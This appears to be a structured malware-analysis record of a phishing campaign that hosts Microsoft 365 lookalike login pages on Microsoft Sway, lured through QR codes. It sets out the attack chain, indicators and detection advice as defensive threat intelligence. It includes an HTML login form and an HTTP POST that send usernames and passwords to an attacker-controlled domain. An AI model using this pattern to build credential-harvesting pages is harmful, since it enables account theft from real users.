package_info.package_versions: N/A (abuse of cloud service, not a traditional package)
package_info.why_malicious: The entire campaign leverages Microsoft Sway to host phishing pages that mimic Microsoft 365 login screens, using QR codes to lure victims and adversary-in-the-middle techniques to steal credentials and 2FA codes. The infrastructure is abused to evade detection and gain user trust, with additional anti-scanning measures like Cloudflare Turnstile.

malicious_snippets.code_behavior: When the user scans the QR code, the embedded URL redirects them to a phishing page hosted on Microsoft Sway, bypassing email scanners and leading to credential harvesting.

malice_analysis.why_suspicious: Embedding URLs in QR codes is a known evasion technique to bypass text-based email security scanners.
malice_analysis.violated_expectations: Legitimate QR codes in business emails rarely direct users to login pages, especially for sensitive services like Microsoft 365.
malice_analysis.similar_legitimate_use: QR codes are sometimes used for legitimate document sharing or event check-ins.
key_indicators: QR code in email leading to login page
URL points to sway.cloud.microsoft with suspicious path

execution_context.trigger: user visits phishing page (after QR scan or link click)
execution_context.file_location: HTML/JS code on sway.cloud.microsoft phishing page

malicious_snippets.code_snippet:
<form id="loginForm" action="https://login.msofficeopt.nl/submit" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
  <button type="submit">Sign in</button>
</form>
malicious_snippets.code_behavior: When the user submits their credentials, the form sends the username and password to an attacker-controlled domain, enabling credential theft.

malice_analysis.why_suspicious: The form action points to a domain unrelated to Microsoft, indicating credential exfiltration.
malice_analysis.violated_expectations: Legitimate Microsoft login forms POST to microsoft.com or login.microsoftonline.com, not third-party domains.
malice_analysis.similar_legitimate_use: None; login forms for Microsoft services should never post to non-Microsoft domains.

execution_context.file_location: HTML/JS code on sway.cloud.microsoft phishing page

malicious_snippets.code_behavior: Upon page load, the Cloudflare Turnstile CAPTCHA is presented, blocking automated scanners and only allowing human users to proceed to the phishing payload.

malice_analysis.why_suspicious: Use of CAPTCHA (Cloudflare Turnstile) on a login page is uncommon for Microsoft 365 and is used here to evade automated security scanners.
malice_analysis.violated_expectations: Legitimate Microsoft login pages do not use Cloudflare Turnstile; CAPTCHAs are rare and typically not third-party.
malice_analysis.similar_legitimate_use: Some legitimate sites use CAPTCHAs to prevent abuse, but not on Microsoft 365 login.
key_indicators: Cloudflare Turnstile on Microsoft login lookalike

execution_context.file_location: Server-side script on attacker-controlled domain (e.g., login.msofficeopt.nl)

malicious_snippets.code_snippet:
POST /submit HTTP/1.1
Host: login.msofficeopt.nl
Content-Type: application/x-www-form-urlencoded

username=...&password=...
malicious_snippets.code_behavior: When the victim submits the form, their credentials are sent via HTTP POST to the attacker's server, enabling credential theft.

malice_analysis.why_suspicious: Credentials are sent to a non-Microsoft domain, indicating exfiltration.
malice_analysis.violated_expectations: Legitimate login forms for Microsoft 365 never send credentials to third-party domains.

malicious_snippets.code_behavior: After credentials are stolen, the victim is redirected to the legitimate Microsoft Outlook site to reduce suspicion.

malice_analysis.why_suspicious: Redirection to a legitimate site after credential theft is a common anti-detection and anti-suspicion tactic.
malice_analysis.violated_expectations: Legitimate login failures would show an error, not redirect to a logged-in page.
malice_analysis.similar_legitimate_use: Some SSO flows redirect after login, but not after failed authentication.
key_indicators: Immediate redirection to legitimate service after credential POST
No error message on failed login

attack_chain.action: Victim receives phishing email containing a QR code or link to a sway.cloud.microsoft page.
attack_chain.leads_to: Victim scans QR code or clicks link, opening phishing page.

attack_chain.action: Victim is presented with a Microsoft 365 lookalike login page, possibly gated by Cloudflare Turnstile CAPTCHA.
attack_chain.leads_to: Victim enters credentials into phishing form.

attack_chain.action: Victim's credentials are sent to attacker-controlled server.
attack_chain.leads_to: Attacker receives credentials; victim is redirected.

attack_chain.action: Victim is redirected to legitimate Microsoft service to avoid suspicion.
attack_chain.leads_to: Attack complete; victim may not realize compromise.

behavioral_signatures: Emails containing QR codes that resolve to sway.cloud.microsoft URLs
Microsoft 365 login forms posting to non-Microsoft domains
Use of Cloudflare Turnstile CAPTCHA on Microsoft login lookalike pages
Immediate redirection to legitimate Microsoft services after credential submission
file_indicators: HTML files on sway.cloud.microsoft with login forms
QR code images embedded in phishing emails
Presence of Cloudflare Turnstile scripts on Sway-hosted pages
network_indicators: Outbound connections to sway.cloud.microsoft with suspicious paths
POST requests to domains like login.msofficeopt.nl, gdu.msofficeopt.nl, ffnthost365.cfd, nedttis365.xyz, msntntion0.cfd
Use of Cloudflare Turnstile API from non-legitimate login pages
detection_knowledge.how_to_detect: Monitor for emails containing QR codes that resolve to sway.cloud.microsoft URLs, especially those leading to login forms. Flag Sway-hosted pages that include login forms posting to non-Microsoft domains or that load Cloudflare Turnstile. Watch for POST requests from endpoints to known phishing domains. Alert on immediate redirection to Microsoft services after credential submission on non-Microsoft domains.
